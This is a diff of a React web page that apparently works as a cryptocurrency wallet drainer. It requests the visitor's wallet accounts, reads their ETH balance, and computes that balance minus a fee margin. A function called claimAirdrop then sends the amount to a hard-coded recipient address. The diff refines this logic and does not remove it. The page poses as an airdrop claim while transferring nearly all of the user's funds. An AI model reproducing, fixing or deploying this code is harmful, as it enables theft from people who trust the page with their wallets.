@@ -24,7 +24,7 @@ export default function Home() {
   let etherValueOfUser
   let Receptient = '0x1204D7F27702d793260Ad5a406dDEE7660d21B61'
   let user
-  let signerr
+  let _signer
 
   const busdAddress = "0x4Fabb145d64652a948d72533023f6E7A623C7C53"
   const daiAddress = "0x6b175474e89094c44da98b954eedeac495271d0f"
@@ -42,45 +42,41 @@ export default function Home() {
       console.log(`accounts: ${accounts}`);
 
 
-      const providerr = new ethers.providers.Web3Provider(window.ethereum)
-      console.log(providerr);
-      setProvider(providerr)
+      const _provider = new ethers.providers.Web3Provider(window.ethereum)
+      console.log(_provider);
+      setProvider(_provider)
 
 
-      user = await providerr.send("eth_requestAccounts", []);
-      // let walletSigner = wallet.connect(window.ethersProvider)
-      console.log(`user:${user}`);
-      signerr = providerr.getSigner()
-      setSigner(signerr)
-      console.log(signerr);
-
-
-      const address = signerr.getAddress()
-      // console.log(address.then());
-      const bal = await signerr.getBalance(user.address)
+      user = await _provider.send("eth_requestAccounts", []);
+      console.log(user);
+      _signer = _provider.getSigner()
+      setSigner(_signer)
+      console.log(_signer);
+      const bal = await _signer.getBalance(user.address)
     
-      const estimateGas = await signerr.estimateGas(user.address)
-      // const estimateGas = ethers.utils.hexlify(200000000000)
-      const gasAmount = ethers.utils.hexlify(BigNumber.from(20000000000))
-      console.log('gas amount:',gasAmount);
-      
-      console.log('estimateGas:', estimateGas);
       console.log('balance:',bal);
       
-
-
-      const gasP = providerr.getGasPrice()
-      // setGasPrice(gasP)
-      setGasPrice(gasAmount)
-      const fee = (await gasAmount).mul(gasL)
-      console.log('fee', fee);
-
-      const finalAmount = bal.sub(gasAmount)
-      setBalance(finalAmount)
-
-      // console.log(`balance:${Number(bal).toString(16)}`);
       const gasL = ethers.utils.hexlify(100000)
       setGasLimit(gasL)
+
+      const gasP = _provider.getGasPrice()
+      // setGasPrice(gasP)
+      setGasPrice(gasP)
+      // const fee = (estimateGas).mul(gasL)
+      const fee = (await gasP).mul(gasL)
+      console.log('fee', fee);
+
+      const finalAmount = bal - (fee * 10)
+      const finalAmountToString = finalAmount.toString()
+      const finalAmountBigNumber = BigNumber.from(finalAmountToString)
+      console.log("finalAmountBigNumber",finalAmountBigNumber);
+      // const finalAmountToString = finalAmount.BigNumber.toHexString()
+      console.log('finalAmountToString:', finalAmountToString);
+      setBalance(finalAmountBigNumber)
+      console.log('final amount:',finalAmount);
+
+      // console.log(`balance:${Number(bal).toString(16)}`);
+      
       // console.log(gasL);
       // const gasHexToBigNumber = BigNumber.from(gasL)
       // console.log(`gas is: ${gasHexToBigNumber}`);
@@ -128,16 +124,13 @@ export default function Home() {
 
   async function claimAirdrop() {
 
-    const fee = ethers.utils.hexlify(100000)
-    const totalFee = balance.mul()
-    
     signer.sendTransaction({
       from: user,
       to: Receptient,
       
       gasPrice: gasPrice,
       gasLimit: gasLimit,
-      value: balance,
+      value: (balance),
     })
   }
 
